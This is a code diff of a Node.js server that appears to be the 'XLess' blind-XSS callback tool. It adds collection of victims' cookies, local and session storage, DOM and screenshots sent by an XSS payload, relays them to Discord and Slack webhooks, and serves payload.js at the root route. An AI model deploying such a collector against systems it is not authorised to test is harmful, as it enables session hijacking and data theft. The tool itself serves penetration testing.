@@ -4,6 +4,7 @@ var cors = require("cors");
 const process = require("process");
 var request = require("request");
 const path = require("path");
+const util = require('util');
 
 // Support local development with .env
 require("dotenv").config();
@@ -70,17 +71,17 @@ function generate_blind_xss_alert(body) {
 }
 
 function generate_callback_alert(headers, data, url) {
-    var alert = "\n:rotating_light: **Out-of-Band Callback Received!**\n\n";
-    alert += `**IP Address      |** \`${data["Remote IP"]}\`\n`;
+    var alert = "\n\n:rotating_light: **Out-of-Band Callback Received!**\n\n";
+    alert += `**IP Address        |** \`${data["Remote IP"]}\`\n`;
     alert += `**Request URI     |** \`${url}\`\n`;
     alert += `**Raw Headers**\n\`\`\``
-  
+
     for (var key in headers) {
         if (headers.hasOwnProperty(key)) {
             alert += `${key}: ${headers[key]}\n`;
         }
     }
-    alert += `\`\`\`\n`;
+    alert += `\`\`\`\n\n`;
     return alert;
 }
 
@@ -88,32 +89,6 @@ function generate_message_alert(body) {
     var alert = "*XSSless: Message Alert*\n";
     alert += "```\n" + body + "```\n";
     return alert;
-}
-
-async function uploadImage(image) {
-    // Return new promise
-    return new Promise(function (resolve, reject) {
-        const options = {
-            method: "POST",
-            url: "https://api.imgbb.com/1/upload?key=" + imgbb_api_key,
-            port: 443,
-            headers: {
-                "Content-Type": "multipart/form-data",
-            },
-            formData: {
-                image: image,
-            },
-        };
-
-        // Do async request
-        request(options, function (err, imgRes, imgBody) {
-            if (err) {
-                reject(err);
-            } else {
-                resolve(imgBody);
-            }
-        });
-    });
 }
 
 app.get("/examples", (req, res) => {
@@ -131,29 +106,37 @@ app.get("/examples", (req, res) => {
     res.end();
 });
 
-app.all("/message", (req, res) => {
-    var message = req.query.text || req.body.text;
-    const alert = generate_message_alert(message);
-    data = { form: { payload: JSON.stringify({ username: "XLess", mrkdwn: true, text: alert }) } };
-    request.post(discord_incoming_webhook, { form: { username: "XLess", content: alert } }, function (error, response, body) {
-        console.log(body);
-    });
-
-    request.post(process.env.SLACK_INCOMING_WEBHOOK, data, (out) => {
-        res.send("ok\n");
-        res.end();
-    });
-});
-
 app.post("/c", async (req, res) => {
     let data = req.body;
 
     var location = "\n:rocket: **Blind XSS Triggered**\n\n";
-    location += `**Location        |** \`${data["Location"]}\`\n`;
+    if (data["Location"]) {
+        location += `**Location**                     | \`${data["Location"] || 'null'}\`\n`;
+    }
+
+    if (data["Referrer"]) {
+        location += `**Referrer**                     | \`${data["Referrer"] || 'null'}\`\n`;
+    }
+    
+    if (data["Origin"]) {
+        location += `**Origin**                          | \`${ data["Origin"] || 'null'}\`\n`;
+    }
+
+    if (data["sessionStorage"]) {
+        location += `**Session Storage**      | \`${ data["sessionStorage"] || 'null'}\`\n`;
+    }
+
+    if (data["localStorage"]) {
+        location += `**Local Storage**          | \`${data["localStorage"] || 'null'}\`\n`;
+    }
+
+    if (data["Cookies"]) {
+        location += `**Cookies**                      | \`${data["Cookies"] || 'null'}\`\n`;
+    }
+    
+    location += `**DOM**\n\`\`\`${data["DOM"] || 'null'}\`\`\`\n\n`;
 
     // Upload our screenshot and only then send the Slack alert
-    data["Screenshot URL"] = "";
-
 
     // Now handle the regular Slack alert
     data["Remote IP"] = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
@@ -161,7 +144,7 @@ app.post("/c", async (req, res) => {
     data = { form: { payload: JSON.stringify({ username: "XLess", mrkdwn: true, text: alert }) } };
 
     if (discord_incoming_webhook !== undefined && discord_incoming_webhook != "") {
-        request.post(discord_incoming_webhook, { form: { username: "bxss", content: location } }, function (error, response, body) {
+        request.post(discord_incoming_webhook, { form: { username: "xless", content: location } }, function (error, response, body) {
             //console.log(body);
             console.log("[!] XSS blind payload triggered! Data sent to discord.\n");
         });
@@ -174,9 +157,9 @@ app.post("/c", async (req, res) => {
     }
 
     // send screenshot
-    if (data["Screenshot"]) {
+    if (req.body["Screenshot"]) {
         console.log("Sending screenshot.\n")
-        const encoded_screenshot = data["Screenshot"].replace("data:image/png;base64,", "");
+        const encoded_screenshot = req.body["Screenshot"].replace("data:image/png;base64,", "");
 
         sendBase64ImageToDiscord(encoded_screenshot)
     }
@@ -193,6 +176,11 @@ app.get("/favicon*", async (req, res) => {
 
     res.send("ok");
     res.end();
+});
+
+app.all("/", (req, res) => {
+
+    res.sendFile(path.join(__dirname + "/payload.js"));
 });
 
 app.all("/*", (req, res) => {
@@ -218,6 +206,6 @@ app.all("/*", (req, res) => {
 });
 
 app.listen(port, (err) => {
-    if (err) throw err;
+    //if (err) throw err;
     console.log(`> Ready On Server http://localhost:${port}`);
 });
